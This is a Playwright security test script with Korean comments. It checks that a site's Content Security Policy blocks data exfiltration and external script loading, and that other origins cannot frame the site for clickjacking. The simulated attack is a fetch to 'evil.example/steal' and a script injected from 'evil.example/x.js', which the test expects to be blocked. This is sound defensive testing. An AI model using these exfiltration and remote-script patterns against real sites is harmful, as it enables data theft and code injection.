// === AI 해커: 페이지 방화벽(콘텐츠 보안 정책·클릭재킹) 침투 테스트 ===
// 저장소의 정적 서버 두 개(사이트, 공격자 사이트)를 스스로 띄우고, 실제 브라우저로 공격해요.
// 뚫림 기준: 정상 사용 중 방화벽에 걸림 · 페이지 오류 · 외부 스크립트 로드 성공 · 외부 서버로 자료 유출 성공 · 다른 사이트가 우리 화면을 끼워 넣음.
// 실행: node tests/pages-csp.mjs   (Chromium·Playwright 필요)
import http from 'node:http';
import { readFile } from 'node:fs/promises';
import { fileURLToPath } from 'node:url';
import { createRequire } from 'node:module';
import path from 'node:path';

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const PAGES = ['index.html', 'pos.html', 'price.html', 'buy.html', 'translate.html', 'japanese.html', 'offline.html', 'travel-map/index.html', 'travel/index.html'];
const TYPES = { '.html': 'text/html', '.js': 'text/javascript', '.json': 'application/json', '.svg': 'image/svg+xml', '.webmanifest': 'application/manifest+json', '.png': 'image/png', '.css': 'text/css', '.csv': 'text/csv; charset=utf-8' };

function siteServer() {
  return http.createServer(async (req, res) => {
    const p = decodeURIComponent(req.url.split('?')[0]);
    try {
      const buf = await readFile(path.join(ROOT, p === '/' ? 'index.html' : p));
      res.writeHead(200, { 'content-type': TYPES[path.extname(p)] || 'application/octet-stream' });
      res.end(buf);
    } catch { res.writeHead(404); res.end('nf'); }
  });
}
function evilServer(sitePort) {
  return http.createServer((req, res) => {
    res.writeHead(200, { 'content-type': 'text/html' });
    res.end(`<!doctype html><title>evil</title><iframe id=f src="http://localhost:${sitePort}/index.html" style="width:900px;height:700px"></iframe>`);
  });
}
const listen = (srv) => new Promise((r) => srv.listen(0, () => r(srv.address().port)));

async function main() {
  let chromium;
  try {
    const require = createRequire(import.meta.url); // 전역 설치본도 찾도록 CommonJS 해석을 써요
    ({ chromium } = require('playwright'));
  } catch {
    try { ({ chromium } = await import('playwright')); }
    catch { console.error('Playwright가 필요해요: npx playwright 를 쓸 수 있는 환경에서 실행하세요.'); process.exit(2); }
  }

  const site = siteServer(); const sitePort = await listen(site);
  const evil = evilServer(sitePort); const evilPort = await listen(evil);
  const b = await chromium.launch({ args: ['--no-sandbox'] }); // CI 컨테이너에서 root로 띄울 때 필요
  const rows = [];

  for (const p of PAGES) {
    const ctx = await b.newContext(); const page = await ctx.newPage();
    const errs = [];
    await page.addInitScript(() => { window.__v = []; document.addEventListener('securitypolicyviolation', (e) => window.__v.push(e.effectiveDirective + ' ' + e.blockedURI)); });
    page.on('pageerror', (e) => errs.push(String(e).slice(0, 160)));
    page.on('dialog', (d) => d.dismiss().catch(() => {}));
    await page.goto(`http://localhost:${sitePort}/${p}`, { waitUntil: 'load' });
    await page.waitForTimeout(1200);
    // 정상 사용 흉내: 보이는 버튼 눌러 보기
    let clicked = 0;
    for (const el of (await page.$$('button:visible, [onclick]:visible')).slice(0, 25)) { try { await el.click({ timeout: 250 }); clicked++; } catch {} }
    await page.waitForTimeout(400);
    const normalViol = await page.evaluate(() => window.__v.slice());
    const visible = await page.evaluate(() => getComputedStyle(document.documentElement).display !== 'none' && document.body.innerText.trim().length > 0);
    // 공격: 외부로 자료 빼내기 + 외부 스크립트 로드
    const atk = await page.evaluate(async () => {
      const o = {};
      try { await fetch('https://evil.example/steal?d=1', { mode: 'no-cors' }); o.fetch = 'SENT'; } catch { o.fetch = 'blocked'; }
      o.script = await new Promise((res) => { const s = document.createElement('script'); s.src = 'https://evil.example/x.js'; s.onerror = () => res('blocked'); s.onload = () => res('LOADED'); document.head.appendChild(s); setTimeout(() => res('blocked'), 1500); });
      o.viol = window.__v.filter((x) => x.includes('evil.example')).length;
      return o;
    });
    const attackBlocked = atk.fetch === 'blocked' && atk.script === 'blocked' && atk.viol >= 2;
    const pass = !normalViol.length && !errs.length && visible && attackBlocked;
    rows.push({ name: p, pass, detail: `정상위반 ${normalViol.length} · 오류 ${errs.length} · 유출 ${atk.fetch} · 외부스크립트 ${atk.script}` });
    await ctx.close();
  }

  // 같은 사이트 끼우기(POS 미리보기)는 허용돼야 함
  {
    const page = await b.newPage(); await page.goto(`http://localhost:${sitePort}/index.html`);
    const disp = await page.evaluate(() => new Promise((res) => { const f = document.createElement('iframe'); f.src = 'pos.html'; f.onload = () => res(getComputedStyle(f.contentDocument.documentElement).display); document.body.appendChild(f); setTimeout(() => res('timeout'), 8000); }));
    rows.push({ name: '같은 사이트 iframe 허용(pos)', pass: disp !== 'none' && disp !== 'timeout', detail: `display=${disp}` });
    await page.close();
  }
  // 다른 사이트의 클릭재킹은 막혀야 함
  {
    const page = await b.newPage(); await page.goto(`http://localhost:${evilPort}/`); await page.waitForTimeout(2500);
    const top = page.url();
    const fr = page.frames().find((f) => f !== page.mainFrame() && f.url().includes(`:${sitePort}`));
    const disp = fr ? await fr.evaluate(() => getComputedStyle(document.documentElement).display) : 'top-navigated';
    rows.push({ name: '클릭재킹 차단(다른 사이트 끼움)', pass: top.includes(`:${sitePort}`) || disp === 'none', detail: `framed display=${disp}` });
    await page.close();
  }

  await b.close(); site.close(); evil.close();

  console.log('\n================  AI 해커: 페이지 방화벽 테스트  ================\n');
  let fail = 0;
  for (const r of rows) { if (!r.pass) fail++; console.log(`    ${r.pass ? '🟢 방어' : '🔴 뚫림'}  ${r.name}  · ${r.detail}`); }
  console.log(`\n총 ${rows.length}건 · ${fail ? '⚠️ 뚫림 ' + fail + '건' : '✅ 전부 방어'}`);
  process.exit(fail ? 1 : 0);
}
main();
